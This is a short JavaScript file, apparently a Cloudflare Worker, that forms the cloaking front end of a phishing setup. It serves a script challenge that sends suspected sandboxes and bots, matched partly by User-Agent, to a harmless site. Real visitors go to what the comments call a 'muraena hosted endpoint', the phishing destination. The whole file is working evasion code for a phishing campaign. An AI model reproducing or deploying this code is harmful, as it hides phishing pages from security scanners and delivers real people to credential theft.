import {CheckSandbox} from './sandbox'

export default {
    async fetch(request, env, ctx) {

        // Redirect to non phishing website, in case of Sandbox detection
        let sandbox_redirect_url = env.SANDBOX_REDIRECT 
        // Redirect to muraena hosted endpoint, in case of real visitor
        let user_redirect_url = env.USER_REDIRECT 

        // Optional final check: match the visitor User-Agent against a
        // configurable pattern (case-insensitive regex). A match is treated
        // as a sandbox/bot. Empty/unset disables the check.
        let ua_pattern = env.UA_PATTERN || ""


        // Generate the AntiSandbox JS payload
        let sandboxJS = CheckSandbox(sandbox_redirect_url, user_redirect_url, ua_pattern)

        return handleRequest(request, sandboxJS).catch(
            (err) => new Response(err.stack, {status: 500}),
        )

    }
};

export async function handleRequest(request, js) {

    // Visitor landed correctly
    // Let's reply with a JS challenge to check if it's a sandbox or legit user
    let html = `<html><head><script>${js}</script></head></html>`

    return new Response(html, {
        headers: {'Content-Type': 'text/html; charset=UTF-8'},
    })

}

